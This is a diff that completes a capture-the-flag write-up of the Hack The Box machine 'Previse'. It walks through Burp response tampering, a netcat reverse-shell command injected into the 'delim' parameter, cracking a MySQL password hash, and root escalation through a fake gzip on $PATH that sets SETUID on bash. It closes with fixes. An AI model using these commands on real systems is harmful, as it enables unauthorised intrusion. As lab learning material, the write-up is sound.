@@ -20,11 +20,11 @@ output: html_document
 ![desc]({{https://jsom1.github.io/}}/_images/htb_prev_desc.png){: height="415px" width = 625px"}
 </div>
 
-**Ports/services exploited:** 80/web application, ssh\\
-**Tools:** dirb, hydra, nikto, gobuster, burp\\
-**Techniques:** ?\\
-**Keywords:** ?\\ 
-**In a nutshell**: ?
+**Ports/services exploited:** 80/web application\\
+**Tools:** dirb, hydra, nikto, gobuster, burp, JtR\\
+**Techniques:** reverse shell, hash cracking, $PATH manipulation\\
+**Keywords:** python eval() function, SETUID\\ 
+**In a nutshell**: The machine is hosting a php web app on which we can create an account. The account page should normally not be reachable, but we can intercept the request's response with Burp and modify its status to 200 OK instead of 301 FOUND, allowing us to reach it and create an account. Once connected, we discover MySQL credentials and our way in: there's a script which uses the vulnerable *exec()* python function. This latter takes an unsanitized user input that can be used to get a reverse shell. At this point, we can access the MySQL database and retrieve a hashed password. Using JtR, we can crack it and either *ssh* or *su* as this user, giving us the user flag. This user can run a script as root, which is vulnerable to a "path injection". This latter uses the *gzip* binary without using an absolute path. Therefore, we can create our own malicious *gzip* file, add it to the $PATH variable and get it executed. It can be used to get a reverse shell or, in this case, to temporarily allow the current user to run */bin/bash* with root permissions via the SETUID bit.
 
 ## 1. Services enumeration
 {:style="color:DarkRed; font-size: 170%;"}
@@ -153,7 +153,7 @@ This doesn't seem to work, we get an invalid user/password when we try to log in
 ![modified response]({{https://jsom1.github.io/}}/_images/htb_prev_repmod.png)
 </div>
 
-Here, we replaced *302* by *200 OK* and forwarded it. Then, we see it actually works:
+Here, we replaced *302 FOUND* by *200 OK* and forwarded it. Then, we see it actually works:
 
 <div class="img_container">
 ![Create acc]({{https://jsom1.github.io/}}/_images/htb_prev_accs.png)
@@ -211,16 +211,116 @@ Let's request a log file and intercept the request with Burp to see the syntax. 
 Line 14 shows the selected delim which is directly passed to the *logs.php* script. By researching more information about the python *exec()* command, I found the exact same article I read for BountyHunter, and talks about command injection in Python using *eval()* and *exec()*. It appears it is the same idea as the previous time. After playing a little bit with the command, I came up with the following one to get a reverse shell:
 
 ````
+delim=comma; nc -nv 10.10.14.12 4444 -e /bin/bash
 ````
+Before forwarding this packet, we set up a netcat listener on port 4444:
 
+````
+sudo nc -nlvp 4444
+`````
 
-## 3. Privilege escalation
+And see if it worked:
+
+<div class="img_container">
+![revshell]({{https://jsom1.github.io/}}/_images/htb_prev_revsh.png)
+</div>
+
+It did, we have a foothold as *www-data*! The flag isn't on that user, so we'll have to find a way to switch to a *normal* user.
+
+## 3. Horizontal privilege escalation
 {:style="color:DarkRed; font-size: 170%;"}
 
+Now that we have a foothold on the machine, we will try to access the MySQL database for which we found credentials earlier with the following command:
 
+````
+mysql -u root -p previse
+`````
+
+This will connect us as the root user to the *previse* database, after supplying the password:
+
+<div class="img_container">
+![mysql]({{https://jsom1.github.io/}}/_images/htb_prev_mysql.png)
+</div>
+
+Now, we use the usual mySQL commands to enumerate the database. We're particularly looking for users passwords:
+
+<div class="img_container">
+![mysql pw]({{https://jsom1.github.io/}}/_images/htb_prev_mysql2.png)
+</div>
+
+And here's a hashed password for the user *m4lwhere*. There's a weird character within it though, and I'm not sure if that could cause problems... Let's still try to crack this hash. We copy it and paste it in a file (*hash.txt* for example). We could use any password cracking tool such as hashcat or JtR, and I chose the latter in this case:
+
+<div class="img_container">
+![pw cracking]({{https://jsom1.github.io/}}/_images/htb_prev_jtr.png)
+</div>
+
+Note that I first used JtR without specifying the hash format (it detects it automatically), but it gave the warning "*detected hash type md5crypt, but the string is also recognized as md5crypt-long*". Ignoring the warning returned a false positive (wrong password).\\
+Now that we have the password, we could either *su m4lwhere* or ssh in. Since exiting mysql also exited my reverse shell, I'll go with the latter option:
+
+````
+sudo ssh m4lwhere@10.10.11.104
+`````
+<div class="img_container">
+![user flag]({{https://jsom1.github.io/}}/_images/htb_prev_user.png)
+</div>
+
+And that's it for the user flag! 
+
+## 3. Vertical privilege escalation
+{:style="color:DarkRed; font-size: 170%;"}
+
+As usual, let's see the output of the *sudo -l* command:
+
+<div class="img_container">
+![sudo -l]({{https://jsom1.github.io/}}/_images/htb_prev_sudol.png)
+</div>
+
+We see m4lwhere can run the *access_backup.sh* bash script as root. This script zips the access.log and file_access.log files into */var/backups*, appending the date of the operation. We also see that this script is run by a cronjob. How could we use this script to our advantage?
+
+I wanted to see if we can edit the script, but it's not the case. By trying *sudo nano /opt/scripts/access_backup.sh*, we get an error: m4lwhere is not allowed to execute nano as root. Could we replace one of those two zipped file by one of our own, and see if we can somehow use *gzip* to do something ?\\
+Sadly, I once again had to look for help. In fact, I should have noticed that the script doesn't specify the path of the *gzip* binary. That means we can create our own *gzip* binary and add it to the $PATH variable. The idea is that when run, the script will look for this binary and will find and execute ours instead of the one which was intended by the author.
+
+We start by switching to */tmp* directory, where we can create our own *gzip* file. We then create it, add it to the $PATH and execute it:
+
+````
+cd /tmp
+echo "chmod +s /bin/bash" > gzip
+cat gzip
+chmod +x gzip
+export PATH=/tmp:$PATH
+sudo -u root /opt/scripts/access_backup.sh
+bash -p
+`````
+More details about the previous commands:
+
+- echo "chmod +s /bin/bash" > gzip: here, *+s* is a special mode called the SETUID (Set owner User ID up on execution) bit. It applies to executables and allows to allocate temporarily  (during execution) to a user the rights of the file owner. In other words, it will allow us to run */bin/bash* as root (by looking at permissions with *ls -al /bin/bash*, we see it is now *-rwsr-sr-x*, *s* being the SETUID bit). We write this command into a file called gzip.
+- chmod +x gzip: we give the gzip file execute permissions.
+- export PATH=/tmp:$PATH: we use the *export PATH* command to add the */tmp* directory at the beginning of the $PATH variable (If we could edit the *access_backup.sh* script, we could simply specify the path as */tmp/gzip*). Note that the usual syntax would rather be *export PATH=$PATH:/place/with/our/file*, but that would add the */tmp* directory add the end of the $PATH variable. The problem is that when we run a program in Linux, it searches in the directories listed in the $PATH, reading from left to right. If we append the */tmp* folder at the end of it, it will find *gzip* in /bin/gzip instead of ours in /tmp/gzip.
+- sudo -u root /opt/scripts/access_backup.sh: we saw we had the permission to execute this script as root, so this is what we do here. The script will use our malicious gzip file which allows us to execute */bin/bash* as root.
+- bash -p: finally, we execute bash and if everything worked fine, it shoud spawn with root privileges.
+
+<div class="img_container">
+![root]({{https://jsom1.github.io/}}/_images/htb_prev_root.png)
+</div>
+
+And we've got the root flag!
+
+<div class="img_container">
+![pwn]({{https://jsom1.github.io/}}/_images/htb_prev_pwn.png)
+</div>
 
 <ins>**My thoughts**</ins>
 
+I am a bit frustrated because I wanted to do this box on my own, but as usual, I had to get help at some point. I think it's important to do so since it's a part of the learning experience, but I would like to do a box without help. Just to prove myself I did some progress.\\
+Regarding the box, it taught me two things that I didn't know about. First, there are cases where we can intercept the response to a request and tamper it in order to actually be able to access the resource. Then, I learned about how we can manipulate $PATH to execute a file of ours if a script doesn't specify the absolute path. These new skills seems very valuable to me and I'm happy to add them to my toolbox.\\
+The hardest part of this box was the foothold, as I had absolutely no idea we could do that on Burp. 
+
 
 <ins>**Fix the vulnerabilities**</ins>
+
+Of course, a user shouldn't be able to modify the response sent from the server. From what I found on the web, the backend should check the user role in each request (if the user has a valid token and if her/his role, saved in the database, is correct to do it). In this case, those checks should be implemented.
+
+Python *eval(), exec() and input()* (in Python 2.x, *input()* is equivalent to *eval(raw_input)*) can be vulnerable to command injection if the user's input isn't sanitized. This issue could be resolved by validating it, for example by using the *validate()* function. This latter should simply check the input against a white list containing the expected input type. Normally, user input in code shouldn't be evaluated dynamically. If this can't be avoided, there must be a strict user input validation. In the case of the *input()* vulnerability (not the case here), upgrading to Python3 would also work, since the vulnerability has been fixed. In this case, another solution was given by the author him/herself: use PHP instead of Python to parse the log delims (input validation should still be check though, but the use of *exec()* could be avoided.
+
+Regarding the vertical privesc, the mistake was also pointed out by the author: the user shouldn't be able to run *access_backup.sh* as root. If this really can't be avoided, then the script should specifiy the absolute path for the *gzip* binary.
 
